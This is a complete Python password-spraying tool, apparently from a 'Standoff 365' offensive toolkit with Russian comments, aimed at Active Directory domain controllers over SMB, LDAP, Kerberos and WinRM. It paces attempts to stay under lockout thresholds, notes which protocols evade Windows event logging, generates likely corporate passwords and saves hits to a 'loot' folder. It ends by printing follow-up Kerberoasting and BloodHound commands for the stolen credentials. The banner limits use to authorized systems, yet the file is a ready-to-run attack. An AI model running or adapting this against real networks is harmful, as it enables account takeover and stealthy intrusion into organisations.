#!/usr/bin/env python3
"""
spray.py — AD Password Spraying с защитой от локаута
Standoff 365 Toolkit

ВАЖНО: Используй ТОЛЬКО на авторизованных системах (Standoff 365, CTF, свои лабы).

Использование:
  python spray.py -d corp.local --dc 10.0.0.1 -U users.txt -p 'Password123'
  python spray.py -d corp.local --dc 10.0.0.1 -U users.txt -P passwords.txt
  python spray.py -d corp.local --dc 10.0.0.1 -U users.txt -p pass --proto kerberos
  python spray.py -d corp.local --dc 10.0.0.1 -U users.txt --gen-passwords -c "CompanyName"
"""

import argparse
import json
import re
import shutil
import subprocess
import sys
import time
from datetime import datetime
from pathlib import Path

try:
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
    from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TaskProgressColumn
    HAS_RICH = True
except ImportError:
    HAS_RICH = False

console = Console() if HAS_RICH else None


# =============================================================================
# Утилиты
# =============================================================================

def log(msg, level="info"):
    ts = datetime.now().strftime("%H:%M:%S")
    icons  = {"info": "[*]", "ok": "[+]", "warn": "[!]", "err": "[-]", "hit": "[HIT]"}
    colors = {"info": "cyan", "ok": "green", "warn": "yellow", "err": "red", "hit": "bold green"}
    if HAS_RICH:
        c = colors.get(level, "white")
        console.print(f"[dim]{ts}[/dim] [{c}]{icons.get(level,'[*]')}[/{c}] {msg}")
    else:
        print(f"{ts} {icons.get(level,'[*]')} {msg}")

def section(title):
    if HAS_RICH:
        console.print(f"\n[bold magenta]{'═'*54}[/bold magenta]")
        console.print(f"[bold magenta]  {title}[/bold magenta]")
        console.print(f"[bold magenta]{'═'*54}[/bold magenta]\n")
    else:
        print(f"\n{'='*54}\n  {title}\n{'='*54}\n")

def save_lines(lines, path):
    Path(path).parent.mkdir(parents=True, exist_ok=True)
    with open(path, "w") as f:
        f.write("\n".join(str(l) for l in lines) + "\n")

def save_json(data, path):
    Path(path).parent.mkdir(parents=True, exist_ok=True)
    with open(path, "w") as f:
        json.dump(data, f, ensure_ascii=False, indent=2)

def cmd_exists(name):
    return shutil.which(name) is not None

def run_silent(cmd, timeout=15):
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return r.stdout + r.stderr, r.returncode
    except Exception:
        return "", -1


# =============================================================================
# Парольная политика — КРИТИЧНО перед spray
# =============================================================================

def get_lockout_policy(domain, dc, username=None, password=None):
    """
    Получаем lockout threshold до начала spray.
    Без этого можно заблокировать весь домен.
    """
    log("Получение парольной политики домена...", "info")

    tool = "netexec" if cmd_exists("netexec") else \
           "crackmapexec" if cmd_exists("crackmapexec") else None

    policy = {
        "threshold":          5,   # безопасное значение по умолчанию
        "observation_window": 30,
        "duration":           30,
    }

    if not tool:
        log("netexec/crackmapexec не найден — политику не получить!", "warn")
        log("Продолжаю с консервативными настройками (threshold=5)", "warn")
        return policy

    args = [tool, "smb", dc, "--pass-pol"]
    if username and password:
        args += ["-u", username, "-p", password]
    else:
        args += ["-u", "", "-p", ""]

    output, rc = run_silent(args, timeout=30)

    if output:
        m = re.search(r'Account Lockout Threshold:\s*(\d+)', output, re.I)
        if m:
            policy["threshold"] = int(m.group(1))

        m = re.search(r'Lockout Observation Window:\s*(\d+)', output, re.I)
        if m:
            policy["observation_window"] = int(m.group(1))

        m = re.search(r'Lockout Duration:\s*(\d+)', output, re.I)
        if m:
            policy["duration"] = int(m.group(1))

    log(f"Парольная политика:", "ok")
    log(f"  Lockout threshold:   {policy['threshold']}", "info")
    log(f"  Observation window:  {policy['observation_window']} мин", "info")
    log(f"  Lockout duration:    {policy['duration']} мин", "info")

    if policy["threshold"] == 0:
        log("Lockout ОТКЛЮЧЁН — можно пробовать любое кол-во паролей", "warn")
    elif policy["threshold"] <= 3:
        log(f"Lockout после {policy['threshold']} попыток — ОЧЕНЬ ОСТОРОЖНО!", "warn")

    return policy


# =============================================================================
# Загрузка списков
# =============================================================================

def load_users(users_file):
    path = Path(users_file)
    if not path.exists():
        log(f"Файл пользователей не найден: {users_file}", "err")
        sys.exit(1)

    users = []
    for line in path.read_text().splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        # Нормализуем: убираем домен
        if "\\" in line:
            line = line.split("\\")[-1]
        if "@" in line:
            line = line.split("@")[0]
        users.append(line)

    # Дедупликация с сохранением порядка
    users = list(dict.fromkeys(users))
    log(f"Загружено пользователей: {len(users)}", "ok")
    return users


def load_passwords(passwords_file=None, single_password=None):
    if single_password:
        return [single_password]

    path = Path(passwords_file)
    if not path.exists():
        log(f"Файл паролей не найден: {passwords_file}", "err")
        sys.exit(1)

    passwords = []
    for line in path.read_text().splitlines():
        line = line.strip()
        if line and not line.startswith("#"):
            passwords.append(line)

    log(f"Загружено паролей: {len(passwords)}", "ok")
    return passwords


# =============================================================================
# Генератор корпоративных паролей
# =============================================================================

def generate_company_passwords(company, domain, year=None):
    """
    Генерируем список вероятных паролей на основе названия компании.
    Покрывает типичные корпоративные паттерны.
    """
    if year is None:
        year = datetime.now().year

    domain_word = domain.split(".")[0]
    prev_year   = year - 1

    base_words = set()
    if company:
        name = company.strip()
        base_words.update([
            name, name.lower(), name.capitalize(), name.upper(),
            name.split()[0] if " " in name else name,
        ])
    base_words.update([
        domain_word, domain_word.capitalize(), domain_word.upper()
    ])

    passwords = set()
    specials = ["!", "@", "1", "123", "1234", "#"]

    # Слово + год + спецсимвол
    for word in base_words:
        for sp in specials:
            passwords.add(f"{word}{year}{sp}")
            passwords.add(f"{word}{prev_year}{sp}")
            passwords.add(f"{word}{year}")
            passwords.add(f"{word}{sp}")

    # Сезонные паттерны
    seasons = [
        f"Winter{year}!", f"Spring{year}!", f"Summer{year}!", f"Autumn{year}!",
        f"Winter{prev_year}!", f"Spring{prev_year}!",
        f"Summer{prev_year}!", f"Autumn{prev_year}!",
    ]
    passwords.update(seasons)

    # Месяца
    months = ["January", "February", "March", "April", "May", "June",
              "July", "August", "September", "October", "November", "December"]
    for m in months:
        passwords.add(f"{m}{year}!")
        passwords.add(f"{m}{prev_year}!")

    # Универсальные корпоративные пароли
    universal = [
        "Password1!", "Password123!", "Password1",
        "Welcome1!", "Welcome123!", "Welcome1",
        "Qwerty123!", "Qwerty1!", "Qwerty123",
        "Admin123!", "Admin1!", "Admin@123",
        "P@ssw0rd", "P@ssw0rd1", "P@ssword1!",
        "Passw0rd!", "Changeme1!", "Changeme123!",
        "Test1234!", "Test123!", "Hello123!",
        "Company1!", "Corp2024!", "Corp2025!",
    ]
    passwords.update(universal)

    return sorted(passwords)


# =============================================================================
# Парсер результатов CME/NetExec
# =============================================================================

def parse_cme_result(output, user, password):
    """Парсим вывод crackmapexec/netexec."""
    out_lower = output.lower()
    result = {"user": user, "password": password, "status": "invalid", "raw": output}

    if "status_account_locked_out" in out_lower or "account_locked" in out_lower:
        result["status"] = "locked"
    elif "status_account_disabled" in out_lower:
        result["status"] = "disabled"
    elif "password_must_change" in out_lower or "status_password_must_change" in out_lower:
        result["status"] = "password_expired"
    elif ("pwn3d!" in out_lower or
          (("+" in output or "[+]" in output) and
           "status_logon_failure" not in out_lower and
           "status_account" not in out_lower)):
        result["status"] = "valid"

    return result


# =============================================================================
# Spray функции по протоколам
# =============================================================================

def spray_smb(domain, dc, users, password, out_dir, jitter=0.5):
    tool = "netexec" if cmd_exists("netexec") else \
           "crackmapexec" if cmd_exists("crackmapexec") else None
    if not tool:
        log("netexec/crackmapexec не найден!", "err")
        return {"valid": [], "locked": [], "disabled": []}

    results = {"valid": [], "locked": [], "disabled": []}

    for user in users:
        output, rc = run_silent(
            [tool, "smb", dc,
             "-u", user, "-p", password,
             "-d", domain, "--no-bruteforce"],
            timeout=15
        )
        r = parse_cme_result(output, user, password)

        if r["status"] == "valid":
            log(f"HIT! {domain}\\{user} : {password}", "hit")
            results["valid"].append({"user": user, "password": password})
        elif r["status"] == "locked":
            log(f"LOCKED: {user}", "warn")
            results["locked"].append(user)
        elif r["status"] == "disabled":
            results["disabled"].append(user)

        if jitter > 0:
            time.sleep(jitter)

    return results


def spray_ldap(domain, dc, users, password, out_dir, jitter=0.5):
    """LDAP spray — тише чем SMB, меньше логов в Windows Event Log."""
    tool = "netexec" if cmd_exists("netexec") else \
           "crackmapexec" if cmd_exists("crackmapexec") else None
    if not tool:
        return {"valid": [], "locked": [], "disabled": []}

    results = {"valid": [], "locked": [], "disabled": []}

    for user in users:
        output, rc = run_silent(
            [tool, "ldap", dc,
             "-u", user, "-p", password, "-d", domain],
            timeout=15
        )
        r = parse_cme_result(output, user, password)

        if r["status"] == "valid":
            log(f"HIT! {domain}\\{user} : {password} (LDAP)", "hit")
            results["valid"].append({"user": user, "password": password})
        elif r["status"] == "locked":
            log(f"LOCKED: {user}", "warn")
            results["locked"].append(user)

        if jitter > 0:
            time.sleep(jitter)

    return results


def spray_kerberos(domain, dc, users, password, out_dir, jitter=0.5):
    """
    Kerberos spray через kerbrute.
    Самый тихий — не генерирует Event ID 4625 (SMB logon failure).
    Генерирует только Kerberos pre-auth failures (4771).
    """
    if not cmd_exists("kerbrute"):
        log("kerbrute не найден! go install github.com/ropnop/kerbrute@latest", "err")
        return {"valid": [], "locked": [], "disabled": []}

    results = {"valid": [], "locked": [], "disabled": []}

    # Создаём временный файл user:pass комбинаций
    combo_file = out_dir / "_temp_kerbrute_combo.txt"
    with open(combo_file, "w") as f:
        for user in users:
            f.write(f"{user}:{password}\n")

    output, rc = run_silent(
        ["kerbrute", "bruteforce",
         "--dc", dc, "-d", domain,
         str(combo_file)],
        timeout=len(users) * 3 + 30
    )

    combo_file.unlink(missing_ok=True)

    for line in output.splitlines():
        if "VALID LOGIN" in line.upper() or "[+]" in line:
            m = re.search(r'(\S+)@\S+:(.+)', line)
            if m:
                user = m.group(1).split("\\")[-1]
                pwd  = m.group(2).strip()
                log(f"HIT! {user} : {pwd} (Kerberos)", "hit")
                results["valid"].append({"user": user, "password": pwd})
        elif "LOCKED" in line.upper():
            m = re.search(r'(\w[\w.-]+)@', line)
            if m:
                results["locked"].append(m.group(1))
                log(f"LOCKED: {m.group(1)}", "warn")

    return results


def spray_winrm(domain, dc, users, password, out_dir, jitter=0.5):
    """WinRM spray — полезно когда SMB/LDAP закрыты файрволом."""
    tool = "netexec" if cmd_exists("netexec") else \
           "crackmapexec" if cmd_exists("crackmapexec") else None
    if not tool:
        return {"valid": [], "locked": [], "disabled": []}

    results = {"valid": [], "locked": [], "disabled": []}

    for user in users:
        output, rc = run_silent(
            [tool, "winrm", dc,
             "-u", user, "-p", password, "-d", domain],
            timeout=15
        )
        r = parse_cme_result(output, user, password)

        if r["status"] == "valid":
            log(f"HIT! {domain}\\{user} : {password} (WinRM)", "hit")
            results["valid"].append({"user": user, "password": password})
        elif r["status"] == "locked":
            log(f"LOCKED: {user}", "warn")
            results["locked"].append(user)

        if jitter > 0:
            time.sleep(jitter)

    return results


# =============================================================================
# Основной класс Sprayer
# =============================================================================

SPRAY_FUNCS = {
    "smb":      spray_smb,
    "ldap":     spray_ldap,
    "kerberos": spray_kerberos,
    "winrm":    spray_winrm,
}


class Sprayer:
    def __init__(self, domain, dc, users, passwords, policy, out_dir,
                 proto="smb", delay=0, jitter=0.5, safe_mode=True):
        self.domain    = domain
        self.dc        = dc
        self.users     = list(users)
        self.passwords = list(passwords)
        self.policy    = policy
        self.out_dir   = Path(out_dir)
        self.proto     = proto
        self.delay     = delay      # мин между раундами (0 = авто)
        self.jitter    = jitter     # сек между попытками
        self.safe_mode = safe_mode

        self.valid_creds  = []
        self.locked_users = []
        self.stats = {
            "attempts": 0,
            "valid":    0,
            "locked":   0,
            "rounds":   0,
        }

        self.valid_file = self.out_dir / "valid_creds.txt"

    def _wait_between_rounds(self, round_num, total_rounds):
        """Ждём между раундами чтобы не триггернуть observation window."""
        if self.delay > 0:
            wait_min = self.delay
        else:
            # Авто: observation window + 5 мин буфер
            wait_min = self.policy.get("observation_window", 30) + 5

        wait_sec = wait_min * 60
        log(f"Раунд {round_num}/{total_rounds} завершён. "
            f"Ждём {wait_min} мин (observation window защита)...", "warn")

        start = time.time()
        if HAS_RICH:
            with Progress(
                SpinnerColumn(),
                TextColumn("[cyan]{task.description}"),
                BarColumn(),
                TaskProgressColumn(),
                console=console,
                transient=True
            ) as progress:
                task = progress.add_task("", total=wait_sec)
                while time.time() - start < wait_sec:
                    elapsed = time.time() - start
                    remaining = int(wait_sec - elapsed)
                    progress.update(
                        task,
                        completed=elapsed,
                        description=f"[cyan]Следующий раунд через "
                                    f"{remaining//60}м {remaining%60}с"
                    )
                    time.sleep(5)
        else:
            while True:
                elapsed = time.time() - start
                remaining = int(wait_sec - elapsed)
                if remaining <= 0:
                    break
                print(f"  Осталось: {remaining//60}м {remaining%60}с...")
                time.sleep(30)

    def _save_hit(self, cred):
        """Сохраняем валидные креды сразу при нахождении."""
        line = f"{self.domain}\\{cred['user']}:{cred['password']}"
        with open(self.valid_file, "a") as f:
            f.write(line + "\n")

    def run(self):
        section("Password Spraying")

        threshold     = self.policy.get("threshold", 5)
        spray_func    = SPRAY_FUNCS.get(self.proto, spray_smb)

        # Безопасное количество паролей за раунд
        if threshold == 0:
            batch_size = len(self.passwords)
        else:
            batch_size = max(1, threshold - 1)

        # Разбиваем на раунды
        rounds = [
            self.passwords[i:i+batch_size]
            for i in range(0, len(self.passwords), batch_size)
        ]

        if HAS_RICH:
            table = Table(show_header=False, box=None)
            table.add_column(style="cyan")
            table.add_column(style="bold white")
            table.add_row("Протокол",         self.proto.upper())
            table.add_row("Пользователей",    str(len(self.users)))
            table.add_row("Паролей",          str(len(self.passwords)))
            table.add_row("Lockout threshold", str(threshold))
            table.add_row("Паролей за раунд", str(batch_size))
            table.add_row("Раундов всего",    str(len(rounds)))
            table.add_row("Jitter",           f"{self.jitter}с")
            console.print(table)
        else:
            print(f"  Протокол:    {self.proto.upper()}")
            print(f"  Юзеров:      {len(self.users)}")
            print(f"  Паролей:     {len(self.passwords)}")
            print(f"  Threshold:   {threshold}")
            print(f"  Раундов:     {len(rounds)}")

        log("", "info")

        for round_num, pw_batch in enumerate(rounds, 1):
            section(f"Раунд {round_num}/{len(rounds)} — пароли: {pw_batch}")

            # Исключаем заблокированных
            active = [u for u in self.users if u not in self.locked_users]
            if not active:
                log("Все пользователи заблокированы! Стоп.", "err")
                break

            log(f"Активных пользователей: {len(active)}", "info")

            for password in pw_batch:
                log(f"Пробуем: {password} ({len(active)} юзеров)", "info")

                result = spray_func(
                    self.domain, self.dc,
                    active, password,
                    self.out_dir, self.jitter
                )

                self.stats["attempts"] += len(active)
                self.stats["valid"]    += len(result["valid"])
                self.stats["locked"]   += len(result["locked"])

                for cred in result["valid"]:
                    self.valid_creds.append(cred)
                    self._save_hit(cred)

                self.locked_users.extend(result.get("locked", []))

                # Safe mode: слишком много локаутов → стоп
                if self.safe_mode and len(result.get("locked", [])) >= 3:
                    log("Safe mode: >3 локаутов за раунд — останавливаемся!", "err")
                    self._print_summary()
                    return self.valid_creds

            self.stats["rounds"] += 1

            if round_num < len(rounds):
                self._wait_between_rounds(round_num, len(rounds))

        self._print_summary()
        return self.valid_creds

    def _print_summary(self):
        section("Итоги")

        if HAS_RICH:
            table = Table(title="Spray Results", header_style="bold cyan")
            table.add_column("Параметр", style="cyan")
            table.add_column("Значение",  style="bold")
            table.add_row("Протокол",   self.proto.upper())
            table.add_row("Попыток",    str(self.stats["attempts"]))
            table.add_row("Раундов",    str(self.stats["rounds"]))
            table.add_row(
                "Найдено кредов",
                f"[bold green]{self.stats['valid']}[/bold green]"
            )
            table.add_row(
                "Заблокировано",
                f"[bold red]{self.stats['locked']}[/bold red]"
            )
            console.print(table)
        else:
            print(f"  Попыток:      {self.stats['attempts']}")
            print(f"  Найдено:      {self.stats['valid']}")
            print(f"  Заблокировано: {self.stats['locked']}")

        if self.valid_creds:
            log(f"Найдено {len(self.valid_creds)} валидных кредентиалов:", "hit")
            for cred in self.valid_creds:
                log(f"  {self.domain}\\{cred['user']} : {cred['password']}", "hit")
            log(f"Сохранено: {self.valid_file}", "ok")
        else:
            log("Валидных кредентиалов не найдено", "warn")


# =============================================================================
# MAIN
# =============================================================================

def parse_args():
    p = argparse.ArgumentParser(
        description="spray.py — AD Password Spraying с защитой от локаута",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Примеры:
  # Один пароль, SMB
  python spray.py -d corp.local --dc 10.0.0.1 -U users.txt -p 'Password123'

  # Список паролей с авто-ожиданием между раундами
  python spray.py -d corp.local --dc 10.0.0.1 -U users.txt -P passwords.txt

  # Kerberos (самый тихий)
  python spray.py -d corp.local --dc 10.0.0.1 -U users.txt -p 'Pass123' --proto kerberos

  # Генерация паролей под компанию + spray
  python spray.py -d corp.local --dc 10.0.0.1 -U users.txt --gen-passwords -c "CompanyName"

  # Принудительная задержка 60 мин между раундами
  python spray.py -d corp.local --dc 10.0.0.1 -U users.txt -P pass.txt --delay 60
        """
    )
    p.add_argument("-d", "--domain",   required=True,
                   help="Домен (corp.local)")
    p.add_argument("--dc",             required=True,
                   help="IP Domain Controller")
    p.add_argument("-U", "--users",    required=True,
                   help="Файл с именами пользователей")
    p.add_argument("-p", "--password", default="",
                   help="Один пароль")
    p.add_argument("-P", "--passwords", default="",
                   help="Файл с паролями (умный spray по раундам)")
    p.add_argument("-c", "--company",  default="",
                   help="Название компании (для --gen-passwords)")
    p.add_argument("--proto",
                   choices=["smb", "ldap", "kerberos", "winrm"],
                   default="smb",
                   help="Протокол (default: smb)")
    p.add_argument("--delay", type=int, default=0,
                   help="Задержка между раундами в мин (0 = авто)")
    p.add_argument("--jitter", type=float, default=0.5,
                   help="Задержка между попытками в сек (default: 0.5)")
    p.add_argument("--gen-passwords",  action="store_true",
                   help="Генерировать список паролей под компанию")
    p.add_argument("--no-policy-check", action="store_true",
                   help="Пропустить проверку политики (ОПАСНО)")
    p.add_argument("--unsafe",         action="store_true",
                   help="Не останавливаться при локаутах")
    p.add_argument("--out",            help="Директория для результатов")
    return p.parse_args()


def main():
    args = parse_args()

    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    out_dir = Path(args.out) if args.out else \
        Path.home() / "standoff-toolkit" / "loot" / f"spray_{args.domain}_{ts}"
    out_dir.mkdir(parents=True, exist_ok=True)

    if HAS_RICH:
        console.print(Panel.fit(
            f"[bold cyan]spray.py[/bold cyan]\n"
            f"[green]Домен:[/green]    {args.domain}\n"
            f"[green]DC:[/green]       {args.dc}\n"
            f"[green]Протокол:[/green] {args.proto.upper()}\n"
            f"[green]Output:[/green]   {out_dir}\n\n"
            f"[bold red]Только для авторизованных систем![/bold red]",
            title="Standoff 365 Toolkit — Spray",
            border_style="cyan"
        ))

    # Загружаем пользователей
    users = load_users(args.users)

    # Определяем пароли
    if args.gen_passwords:
        section("Генерация паролей")
        passwords = generate_company_passwords(args.company, args.domain)
        pw_file = out_dir / "generated_passwords.txt"
        save_lines(passwords, pw_file)
        log(f"Сгенерировано {len(passwords)} паролей → {pw_file}", "ok")
        for pw in list(passwords)[:15]:
            log(f"  {pw}", "info")
        if not args.password and not args.passwords:
            log(f"Запусти с: -P {pw_file}", "info")
            return
    elif args.password:
        passwords = [args.password]
    elif args.passwords:
        passwords = load_passwords(passwords_file=args.passwords)
    else:
        log("Укажи -p, -P или --gen-passwords", "err")
        sys.exit(1)

    # Парольная политика — обязательно перед spray
    if not args.no_policy_check:
        policy = get_lockout_policy(args.domain, args.dc)
    else:
        log("Проверка политики пропущена! Используем threshold=3", "warn")
        policy = {"threshold": 3, "observation_window": 30, "duration": 30}

    threshold = policy.get("threshold", 5)
    if threshold > 0 and len(passwords) >= threshold:
        log(f"Паролей ({len(passwords)}) >= порог локаута ({threshold}) "
            f"→ spray разбит на раунды", "warn")

    # Запуск
    sprayer = Sprayer(
        domain    = args.domain,
        dc        = args.dc,
        users     = users,
        passwords = passwords,
        policy    = policy,
        out_dir   = out_dir,
        proto     = args.proto,
        delay     = args.delay,
        jitter    = args.jitter,
        safe_mode = not args.unsafe,
    )

    valid_creds = sprayer.run()

    # Сохраняем JSON итог
    save_json({
        "domain":      args.domain,
        "dc":          args.dc,
        "protocol":    args.proto,
        "users_count": len(users),
        "valid_creds": valid_creds,
        "stats":       sprayer.stats,
    }, out_dir / "spray_results.json")

    # Следующие шаги
    if valid_creds:
        section("Следующие шаги")
        u = valid_creds[0]["user"]
        pw = valid_creds[0]["password"]
        log("1. Запусти ad_enum.py с найденными кредами:", "ok")
        log(f"   python ad_enum.py -d {args.domain} --dc {args.dc} "
            f"-u {u} -p '{pw}' --full", "info")
        log("2. Kerberoasting:", "ok")
        log(f"   impacket-GetUserSPNs {args.domain}/{u}:'{pw}' "
            f"-dc-ip {args.dc} -request", "info")
        log("3. BloodHound:", "ok")
        log(f"   bloodhound-python -d {args.domain} -u {u} -p '{pw}' "
            f"-ns {args.dc} -c All", "info")

    log(f"Все результаты: {out_dir}", "ok")


if __name__ == "__main__":
    main()